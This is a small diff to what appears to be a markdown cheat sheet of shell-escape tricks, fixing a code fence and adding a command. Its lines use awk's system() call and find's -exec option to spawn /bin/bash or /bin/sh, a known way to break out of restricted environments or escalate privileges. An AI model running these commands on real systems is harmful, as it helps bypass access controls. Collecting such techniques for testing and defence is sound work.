@@ -109,8 +109,8 @@ awk 'BEGIN {system("/bin/bash")}'
 find  -exec /bin/awk 'BEGIN {system("bin/sh")}'
 ```
 OR:
-```bas
-find
+```bash
+find -exec /bin/bash \; quit 
 ```
 
 
